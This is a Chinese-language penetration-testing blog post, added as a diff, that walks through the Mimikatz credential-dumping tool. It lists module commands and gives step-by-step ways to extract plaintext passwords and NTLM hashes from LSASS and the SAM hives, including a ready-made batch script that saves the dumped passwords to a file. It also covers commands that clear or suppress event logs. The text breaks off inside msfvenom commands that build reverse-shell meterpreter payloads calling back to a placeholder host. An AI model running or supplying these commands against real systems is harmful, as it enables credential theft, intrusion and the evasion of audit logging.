@@ -1,0 +1,1356 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="工具,web安全,TOOLS,渗透测试,目录扫描," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简介Mimikatz 是法国人 benjamin 开发的一款功能强大的轻量级调试工具，本意是用来个人测试，但由于其功能强大，能够直接读取 WindowsXP-2012（2016 做了安全防护，需要修改注册表值，重启后生效，可以获取明文密码）等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具，从早期 1.0 版本到现在的 2.1.1 20180205 版本，其功能得到了很大的提升和扩展。 M">
+<meta name="keywords" content="工具,web安全,TOOLS,渗透测试,目录扫描">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mimikatz">
+<meta property="og:url" content="http://Franci4.github.io/uncategorized/Mimikatz.html">
+<meta property="og:site_name" content="Franci4‘Blog">
+<meta property="og:description" content="简介Mimikatz 是法国人 benjamin 开发的一款功能强大的轻量级调试工具，本意是用来个人测试，但由于其功能强大，能够直接读取 WindowsXP-2012（2016 做了安全防护，需要修改注册表值，重启后生效，可以获取明文密码）等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具，从早期 1.0 版本到现在的 2.1.1 20180205 版本，其功能得到了很大的提升和扩展。 M">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-02-23T08:35:40.358Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Mimikatz">
+<meta name="twitter:description" content="简介Mimikatz 是法国人 benjamin 开发的一款功能强大的轻量级调试工具，本意是用来个人测试，但由于其功能强大，能够直接读取 WindowsXP-2012（2016 做了安全防护，需要修改注册表值，重启后生效，可以获取明文密码）等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具，从早期 1.0 版本到现在的 2.1.1 20180205 版本，其功能得到了很大的提升和扩展。 M">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Franci4'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://Franci4.github.io/uncategorized/Mimikatz.html"/>
+
+
+
+
+
+  <title>Mimikatz | Franci4‘Blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?ae20a92bf1be7844be6727b8782fa4b2";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Franci4‘Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">潜心习安全 低调求发展</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://Franci4.github.io/uncategorized/Mimikatz.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Franci4">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/touxiang.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Franci4‘Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Mimikatz</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-22T19:54:44+08:00">
+                2019-02-22
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-02-23T16:35:40+08:00">
+                2019-02-23
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/uncategorized/Mimikatz.html" class="leancloud_visitors" data-flag-title="Mimikatz">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  14
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Mimikatz 是法国人 benjamin 开发的一款功能强大的轻量级调试工具，本意是用来个人测试，但由于其功能强大，能够直接读取 WindowsXP-2012（2016 做了安全防护，需要修改注册表值，重启后生效，可以获取明文密码）等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具，从早期 1.0 版本到现在的 2.1.1 20180205 版本，其功能得到了很大的提升和扩展。</p>
+<p>Mimikatz 最新版本一共三个文件（mimilib.dll、mimikatz.exe、mimidrv.sys），分为 Win32 位（多了一个 mimilove.exe 文件）和 X64 位。通过它们可以提升进程权限、注入进程读取进程内存，可以直接从 Lsass 中获取当前登录过系统用户的账号明文密码。Lsass 是微软 Windows 系统的安全机制它主要用于本地安全和登录策略，通常我们在登录系统时输入密码之后，密码便会储存在 lsass 内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中，而 Mimikatz 正是通过对 Lsass 的逆算获取到明文密码！</p>
+<p>本文以 Mimikatz 最新版为例，介绍了 Mimikatz 的参数、获取密码以及伪造黄金票据获取域控密码等用户，利用 ms14-068 结合 Mimikatz 获取域控密码等，最后文中还给出了相应的防范方法，对网络攻防都具有一定的借鉴意义。</p>
+<h1 id="Mimikatz参数"><a href="#Mimikatz参数" class="headerlink" title="Mimikatz参数"></a>Mimikatz参数</h1><p>本次测试使用 Win64 版本，将程序解压后，通过 cmd 进入当前目录，执行 Mimikatz 程序，如图1所示，随便输入即可获取帮助信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # mimakatz</span><br><span class="line">ERROR mimikatz_doLocal ; &quot;mimakatz&quot; command of &quot;standard&quot; module not found !</span><br><span class="line"></span><br><span class="line">Module :        standard</span><br><span class="line">Full name :     Standard module</span><br><span class="line">Description :   Basic commands (does not require module name)</span><br><span class="line"></span><br><span class="line">            exit  -  Quit mimikatz //退出</span><br><span class="line">             cls  -  Clear screen (doesn&apos;t work with redirections, like PsExec) //清屏</span><br><span class="line">          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything //对生命，宇宙和万物的终极问题的回答</span><br><span class="line">          coffee  -  Please, make me a coffee! //显示coffee图案</span><br><span class="line">           sleep  -  Sleep an amount of milliseconds 默认睡眠1000ms，后跟时间参数</span><br><span class="line">             log  -  Log mimikatz input/output to file //记录 Mimikatz 所有的输入和输出到当前目录下的 log.txt 文件</span><br><span class="line">          base64  -  Switch file input/output base64 //将输入/输出转换成 base64 编码</span><br><span class="line">         version  -  Display some version informations //查看 Mimikatz 的版本</span><br><span class="line">              cd  -  Change or display current directory //切换或者显示当前目录</span><br><span class="line">       localtime  -  Displays system local date and time (OJ command) //显示系统当前时间和 UTC 时间</span><br><span class="line">        hostname  -  Displays system local hostname //显示主机的名称。</span><br></pre></td></tr></table></figure></p>
+<h1 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h1><p>输入“::”显示其支持模块信息。<br>standard：标准模块，基本命令，不需要模块信息。<br>crypto：加密模块，其后跟以下参数，其使用命令为 crypto:: 参数名，例如 crypto::providers。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # crypto::providers</span><br><span class="line"></span><br><span class="line">CryptoAPI providers :</span><br><span class="line"> 0. RSA_FULL      ( 1)   - Microsoft Base Cryptographic Provider v1.0</span><br><span class="line"> 1. DSS_DH        (13)   - Microsoft Base DSS and Diffie-Hellman Cryptographic Provider</span><br><span class="line"> 2. DSS           ( 3)   - Microsoft Base DSS Cryptographic Provider</span><br><span class="line"> 3. RSA_FULL      ( 1) H - Microsoft Base Smart Card Crypto Provider</span><br><span class="line"> 4. DH_SCHANNEL   (18)   - Microsoft DH SChannel Cryptographic Provider</span><br><span class="line"> 5. RSA_FULL      ( 1)   - Microsoft Enhanced Cryptographic Provider v1.0</span><br><span class="line"> 6. DSS_DH        (13)   - Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider</span><br><span class="line"> 7. RSA_AES       (24)   - Microsoft Enhanced RSA and AES Cryptographic Provider</span><br><span class="line"> 8. RSA_SCHANNEL  (12)   - Microsoft RSA SChannel Cryptographic Provider</span><br><span class="line"> 9. RSA_FULL      ( 1)   - Microsoft Strong Cryptographic Provider</span><br><span class="line"></span><br><span class="line">CryptoAPI provider types:</span><br><span class="line"> 0. RSA_FULL      ( 1) - RSA Full (Signature and Key Exchange)</span><br><span class="line"> 1. DSS           ( 3) - DSS Signature</span><br><span class="line"> 2. RSA_SCHANNEL  (12) - RSA SChannel</span><br><span class="line"> 3. DSS_DH        (13) - DSS Signature with Diffie-Hellman Key Exchange</span><br><span class="line"> 4. DH_SCHANNEL   (18) - Diffie-Hellman SChannel</span><br><span class="line"> 5. RSA_AES       (24) - RSA Full and AES</span><br><span class="line"></span><br><span class="line">CNG providers :</span><br><span class="line"> 0. Microsoft Key Protection Provider</span><br><span class="line"> 1. Microsoft Passport Key Storage Provider</span><br><span class="line"> 2. Microsoft Platform Crypto Provider</span><br><span class="line"> 3. Microsoft Primitive Provider</span><br><span class="line"> 4. Microsoft Smart Card Key Storage Provider</span><br><span class="line"> 5. Microsoft Software Key Storage Provider</span><br><span class="line"> 6. Microsoft SSL Protocol Provider</span><br><span class="line"> 7. Windows Client Key Protection Provider</span><br></pre></td></tr></table></figure></p>
+<p>参考加密算法提供类型及名单<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Module :        crypto</span><br><span class="line">Full name :     Crypto Module</span><br><span class="line"></span><br><span class="line">       providers  -  List cryptographic providers //该命令列出所有 CryptoAPI 提供者。</span><br><span class="line">          stores  -  List cryptographic stores //列出系统存储中的逻辑存储，crypto::stores /systemstore:local_machine。</span><br><span class="line">    certificates  -  List (or export) certificates //显示或者导出证书。</span><br><span class="line">            keys  -  List (or export) keys containers //列出或者显示密钥。</span><br><span class="line">              sc  -  List smartcard readers //此命令列出系统上的智能卡/令牌读取器或将其移出系统；当 CSP 可用时，它会尝试在智能卡上列出密钥。</span><br><span class="line">            hash  -  Hash a password with optional  //显示当前用户的的哈希（LM、NTLM、md5、sha1、sha2）计算值。username</span><br><span class="line">          system  -  Describe a Windows System Certificate (file, TODO:registry or hive) //描述 Windows 系统证书（注册表或者 hive 文件）。</span><br><span class="line">          scauth  -  Create a authentication certitifate (smartcard like) from a CA //从 CA 创建一个认证（智能卡等）</span><br><span class="line">        certtohw  -  Try to export a software CA to a crypto (virtual)hardware //尝试将软件 CA 导出到加密（虚拟）硬件中。</span><br><span class="line">            capi  -  [experimental] Patch CryptoAPI layer for easy export //修补 CryptoAPI 程序方便导出。</span><br><span class="line">             cng  -  [experimental] Patch CNG service for easy export //修补 CNG 服务方便导出。</span><br><span class="line">         extract  -  [experimental] Extract keys from CAPI RSA/AES provider //从 CAPI RSA/AES 提供者获取密钥。</span><br></pre></td></tr></table></figure></p>
+<p>sekurlsa 枚举用户凭证<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">           msv  -  Lists LM &amp; NTLM credentials //获取 LM &amp; NTLM 凭证，可以获取明文密码。</span><br><span class="line">       wdigest  -  Lists WDigest credentials //获取 WDigest 凭证，可以获取明文密码</span><br><span class="line">      kerberos  -  Lists Kerberos credentials //获取 Kerberos 凭证。</span><br><span class="line">         tspkg  -  Lists TsPkg credentials //获取 TsPkg 凭证。</span><br><span class="line">       livessp  -  Lists LiveSSP credentials //获取LiveSSP 凭证。</span><br><span class="line">           ssp  -  Lists SSP credentials //获取凭证。</span><br><span class="line">logonPasswords  -  Lists all available providers credentials //获登录用户信息及密码，如果是在系统权限或者 psexec 进入的系统权限下，直接使用该命令，而无需运行 privilege::debug，否则需要运行该命令。</span><br><span class="line">       process  -  Switch (or reinit) to LSASS process  context //切换或者恢复到 lsass 初始状态。</span><br><span class="line">      minidump  -  Switch (or reinit) to LSASS minidump context //切换或者恢复到 minidump 初始状态。</span><br><span class="line">           pth  -  Pass-the-hash //Pass-the-hash</span><br><span class="line">        krbtgt  -  krbtgt! //krbtgt!</span><br><span class="line">   dpapisystem  -  DPAPI_SYSTEM secret //显示DPAPI_SYSTEM密码值。</span><br><span class="line">         trust  -  Antisocial //显示 Kerberos 票据。</span><br><span class="line">    backupkeys  -  Preferred Backup Master keys  //首选备份主密钥</span><br><span class="line">       tickets  -  List Kerberos tickets //列出Kerberos票据</span><br><span class="line">         ekeys  -  List Kerberos Encryption Keys //显示 Kerberos 加密密钥。</span><br><span class="line">         dpapi  -  List Cached MasterKeys //显示内存中的 MasterKeys</span><br><span class="line">       credman  -  List Credentials Manager //显示管理员凭证。</span><br></pre></td></tr></table></figure></p>
+<p>kerberos：Kerberos 包模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   debug  -  Ask debug privilege  //请求调试权限。</span><br><span class="line">  driver  -  Ask load driver privilege //请求装载驱动权限。</span><br><span class="line">security  -  Ask security privilege //请求装载驱动权限。</span><br><span class="line">     tcb  -  Ask tcb privilege //请求 tcb 权限。</span><br><span class="line">  backup  -  Ask backup privilege //请求 backup 权限。</span><br><span class="line"> restore  -  Ask restore privilege //请求恢复权限。</span><br><span class="line">  sysenv  -  Ask system environment privilege //请求系统环境权限。</span><br><span class="line">      id  -  Ask a privilege by its id //请求 id 特权，参数后跟具体的 id 值，例如请求特权 8：privilege：：id 8。</span><br><span class="line">    name  -  Ask a privilege by its name //请求指定名称的权限</span><br></pre></td></tr></table></figure>
+<p>process：进程模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   list  -  List process //列出进程</span><br><span class="line">exports  -  List exports //导出进程</span><br><span class="line">imports  -  List imports //导入进程</span><br><span class="line">  start  -  Start a process //开始一个进程，后跟进程名称</span><br><span class="line">   stop  -  Terminate a process //停止一个进程，process::stop /pid:1692（结束 pid 为1692的进程）。</span><br><span class="line">suspend  -  Suspend a process //挂起一个进程。</span><br><span class="line"> resume  -  Resume a process //恢复一个进程。</span><br><span class="line">    run  -  Run! //运行一个进程。</span><br><span class="line">   runp  -</span><br></pre></td></tr></table></figure></p>
+<p>service：Service module<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">service::start：开始服务。</span><br><span class="line">service::remove：移除服务。</span><br><span class="line">service::stop：停止服务。</span><br><span class="line">service::suspend：暂停服务。</span><br><span class="line">service::resume：恢复服务。</span><br><span class="line">service::preshutdown：预关闭服务。</span><br><span class="line">service::shutdown：关闭服务。</span><br><span class="line">service::list：列出服务。</span><br><span class="line">service::+ - 安装 Mimikatz 服务。</span><br><span class="line">service::- - 卸载 Mimikatz 服务。</span><br></pre></td></tr></table></figure></p>
+<p>lsadump：LsaDump module<br>Lsadump::sam：该命令转储安全帐户管理器（SAM）数据库，它包含用户密码的 NTLM，有时包含 LM 哈希。</p>
+<p>在线命令提升模式获取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::whoami</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure></p>
+<p>离线获取，通过以下方式备份 SYSTEM＆SAM 配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SystemBkup.hiv</span><br><span class="line">reg save HKLM\SAM SamBkup.hiv</span><br></pre></td></tr></table></figure></p>
+<p>或者使用 Volue Shadow Copy / BootCD 来备份这些文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\config\SYSTEM</span><br><span class="line">C:\Windows\System32\config\SAM</span><br></pre></td></tr></table></figure></p>
+<p>然后执行 mimikatz # lsadump::sam SystemBkup.hiv SamBkup.hiv 即可获取。</p>
+<p>可在线进行破解查询。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Lsadump::secrets：从 registry 或者 hives 获取保存的密码凭据，可以直接获取明文密码。</span><br><span class="line">Lsadump::cache：获取内存中的密码值。</span><br><span class="line">Lsadump::lsa：从 lsa 服务器获取密码，lsadump::lsa /inject /name:krbtgt。</span><br><span class="line">Lsadump::trust：Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fbackupkeys rpdata。</span><br><span class="line">Lsadump::dcsync：Ask a DC to synchronize an object。</span><br><span class="line">Lsadump::dcshadow：They told me I could be anything I wanted, so I became a domain controller。</span><br><span class="line">Lsadump::setntlm：Ask a server to set a new password/ntlm for one user。</span><br><span class="line">Lsadump::changentlm：Ask a server to set a new password/ntlm for one user。</span><br><span class="line">Lsadump::netsync：Ask a DC to send current and previous NTLM hash of DC/SRV/WKS。</span><br></pre></td></tr></table></figure></p>
+<p>ts 终端服务模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ts::sessions：显示当前的会话。</span><br><span class="line">ts::multirdp：允许多个用户使用 rdp，安装 rdp 补丁。</span><br></pre></td></tr></table></figure></p>
+<p>event 事件模块<br>event::drop：启用事件补丁服务，不再记录新产生的事件。<br>event::clear：清除时间日志</p>
+<p>misc 杂项模块，打开 cmd、regedit、taskmgr、ncroutemon、detours、wifi、addsid、memssp、skeleton 等。</p>
+<p>token：令牌操作模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">token::whoami：显示当前的身份。</span><br><span class="line">token::list：列出系统所有的令牌。</span><br><span class="line">token::elevate：冒充令牌。</span><br><span class="line">token::run：运行。</span><br><span class="line">token::revert：恢复到进程令牌。</span><br></pre></td></tr></table></figure></p>
+<p>vault：Windows 信任/凭证模块，Vault::list 列出 Windows 信任/凭证。</p>
+<p>net 显示 user、group、alias、session、wsession、tod、stats、share、serverinfo 等信息。</p>
+<h1 id="Mimikatz-获取密码"><a href="#Mimikatz-获取密码" class="headerlink" title="Mimikatz 获取密码"></a>Mimikatz 获取密码</h1><p>旧版本配合 psexec 密码获取方法及命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">到 tools 目录，psexec \127.0.0.1 cmd</span><br><span class="line">执行 mimikatz</span><br><span class="line">执行 privilege::debug</span><br><span class="line">执行 inject::process lsass.exe sekurlsa.dll</span><br><span class="line">执行 @getLogonPasswords</span><br><span class="line">widget 就是密码</span><br><span class="line">exit 退出，不要直接关闭否则系统会崩溃</span><br></pre></td></tr></table></figure></p>
+<p>bat 脚本获取法:<br>创建 get.bat 脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">mimikatz.exe &lt;command.txt &gt;pass.txt</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></p>
+<p>创建 command.txt 文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">inject::process lsass.exe sekurlsa.dll   </span><br><span class="line">@getLogonPasswords</span><br><span class="line">Exit</span><br></pre></td></tr></table></figure></p>
+<p>执行 get.bat 文件即可获取密码，pass.txt 记录的即为获取的密码，get.bat、command.txt 和 mimikatz.exe 在同一个文件夹下。</p>
+<p>Mimikatz 2.0 以上版本获取系统明文密码</p>
+<p>sekurlsa 获取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></p>
+<p>Lsadump 获取密码<br><code>Lsadump::secrets</code></p>
+<h1 id="MSF-下-Mimikatz-获取密码"><a href="#MSF-下-Mimikatz-获取密码" class="headerlink" title="MSF 下 Mimikatz 获取密码"></a>MSF 下 Mimikatz 获取密码</h1><p>需要生成一个反弹的可执行程序或者通过漏洞直接获取一个反弹的 shell。下面是通过 msfvenom 生成 shell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Linux：msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">Windows：msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect 